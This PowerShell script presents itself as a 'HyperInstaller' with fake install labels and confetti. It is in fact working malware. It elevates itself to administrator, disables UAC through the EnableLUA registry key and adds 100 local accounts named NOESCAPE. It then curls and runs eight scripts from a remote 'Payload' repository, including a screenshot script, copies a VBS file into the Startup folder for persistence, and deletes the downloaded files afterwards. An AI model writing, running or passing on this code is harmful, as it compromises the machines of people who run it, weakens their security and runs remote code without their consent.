# --- Elevate to Admin ---
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
    ).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $args = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb RunAs -ArgumentList $args
    exit
}

# --- Load WinForms & Drawing ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# --- Confetti Effect ---
function New-ConfettiWindow {
    $f = New-Object System.Windows.Forms.Form -Property @{
        Size             = New-Object System.Drawing.Size(50,50)
        FormBorderStyle  = 'None'
        TopMost          = $true
        StartPosition    = 'Manual'
    }
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $f.Location = New-Object System.Drawing.Point(
        (Get-Random -Minimum 0 -Maximum ($bounds.Width - $f.Width)),
        (Get-Random -Minimum 0 -Maximum ($bounds.Height - $f.Height))
    )
    $colors = [System.Enum]::GetValues([System.Drawing.KnownColor])
    $f.BackColor = [System.Drawing.Color]::FromKnownColor($colors[
        (Get-Random -Minimum 0 -Maximum $colors.Length)
    ])

    $t = New-Object System.Windows.Forms.Timer -Property @{ Interval = 1000 }
    Register-ObjectEvent -InputObject $t -EventName Tick -Action {
        $f.Close(); $t.Stop()
    } | Out-Null
    $t.Start()
    $f.Show()
}

# --- Set Install Folder ---
try {
    $desktopPath      = [Environment]::GetFolderPath('Desktop')
    $finalInstallPath = if (Test-Path $desktopPath) { $desktopPath } else { Split-Path -Parent $MyInvocation.MyCommand.Path }
} catch {
    $finalInstallPath = Split-Path -Parent $MyInvocation.MyCommand.Path
}
New-Item -ItemType Directory -Path $finalInstallPath -Force | Out-Null

# --- Fake Install Labels ---
$fakeFiles = @(
    "installing roblox.exe",
	"installing roblox.exe",
	"installing roblox.exe",
	"installing roblox.exe",
	"installing roblox.exe",
    "installing virus exprince module V 3.0",
	"installing virus exprince module V 3.0",
	"installing virus exprince module V 3.0",
	"installing virus exprince module V 3.0",
	"installing virus exprince module V 3.0",
    "booting squirrel_os_legacy.pkg",
	"booting squirrel_os_legacy.pkg",
	"booting squirrel_os_legacy.pkg",
	"booting squirrel_os_legacy.pkg",
    "uploading beard_firmware.v2"
	"uploading beard_firmware.v2"
	"uploading beard_firmware.v2"
	"uploading beard_firmware.v2"
	"uploading beard_firmware.v2"

)

# --- URLs to Include in .bat File ---
$downloadUrls = @(
    "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk.vbs",
    "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk1.vbs",
    "https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.bat",
    "https://raw.githubusercontent.com/DanielNov2014/Payload/main/Screenshot.ps1",
    "https://raw.githubusercontent.com/DanielNov2014/Payload/main/Payload.bat",
    "https://raw.githubusercontent.com/DanielNov2014/Payload/main/soundplayer.bat",
    "https://raw.githubusercontent.com/DanielNov2014/Payload/main/start.bat",
    "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2.vbs"
)

# --- Create the .bat Downloader File ---
$batPath = Join-Path $finalInstallPath "payload_downloader.bat"
$batLines = @(
    '@echo off',
    'cd /d "%~dp0"'
)
foreach ($url in $downloadUrls) {
    $batLines += "curl -O `"$url`""
}
Set-Content -Path $batPath -Value $batLines -Encoding ASCII

# --- GUI Setup ---
$form = New-Object System.Windows.Forms.Form -Property @{
    Text          = "HyperInstaller vX.9.7"
    Size          = New-Object System.Drawing.Size(500,160)
    StartPosition = 'CenterScreen'
    BackColor     = [System.Drawing.Color]::White
}

$label = New-Object System.Windows.Forms.Label -Property @{
    Location  = New-Object System.Drawing.Point(20,20)
    Size      = New-Object System.Drawing.Size(450,20)
    ForeColor = [System.Drawing.Color]::Lime
    Text      = "Initializing Installer..."
}
$form.Controls.Add($label)

$progressBar = New-Object System.Windows.Forms.ProgressBar -Property @{
    Location  = New-Object System.Drawing.Point(20,50)
    Size      = New-Object System.Drawing.Size(450,30)
    Style     = 'Continuous'
    Minimum   = 0
    Maximum   = 100
    Value     = 0
}
$form.Controls.Add($progressBar)

# --- Show the Form & Simulate Progress ---
$form.Add_Shown({ $form.Activate() })
$form.Show()
for ($i = 0; $i -le 100; $i += 5) {
    $progressBar.Value = $i
    $label.Text        = $fakeFiles[($i / 5) % $fakeFiles.Length]
    Start-Sleep -Milliseconds 100
    [System.Windows.Forms.Application]::DoEvents()
}

# --- Download Stage ---
$label.Text = "Downloading payload_downloader.bat..."
# Run and wait for downloader to finish
Start-Process -FilePath $batPath -WorkingDirectory $finalInstallPath -Wait

# --- Launch Payload.bat ---
$label.Text = "Starting Payload.bat..."
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

# --- Celebration & Cleanup ---
[System.Windows.Forms.MessageBox]::Show(
    "INSTALLATION SUCCESSFUL!",
    "GO GO GO!!!",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Information
)
1..30 | ForEach-Object { New-ConfettiWindow; Start-Sleep -Milliseconds 100 }
Start-Process explorer.exe $finalInstallPath
# 1. Define your batch content
$batContent = @'
@echo off
:: @echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
Set /a loop = 0

:loopstart
ping 127.0.0.1 -n 1 -w 50 >nul
net user NOESCAPE%loop% /add

ping 127.0.0.1 -n 1 -w 50 >nul
goto check

:check
if %loop% == 100 goto done
echo %loop%
Set /a loop += 1
goto loopstart

:done
PowerShell -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.SelectVoice('Microsoft David Desktop'); $speak.Speak('hello user we have just added 100 accounts to your pc')"
curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk.vbs"
curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk1.vbs"
curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.bat"
curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/Screenshot.ps1"
curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/Payload.bat"
curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/soundplayer.bat"
curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/start.bat"
curl -O "https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk2.vbs"
@echo off
copy "./talk2.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
start talk.vbs
start fileadder.bat
timeout 3 > nul
del /f /q "talk.vbs"
del /f /q "fileadder.bat"
del /f /q "Screenshot.ps1"
start talk1.vbs
timeout 6 > nul
del /f /q "talk1.vbs"
start Payload.bat
'@

# 2. Write to a temp file
$tempBat = Join-Path $env:TEMP 'install.bat'
$batContent | Out-File -FilePath $tempBat -Encoding ASCII

# 3. Execute it elevated and wait
Start-Process -FilePath $tempBat -Verb RunAs -Wait

<# $payloadBat = Join-Path $finalInstallPath "Payload.bat"
Start-Process -FilePath $payloadBat -WorkingDirectory $finalInstallPath #>
Start-Sleep 1
$form.Close()
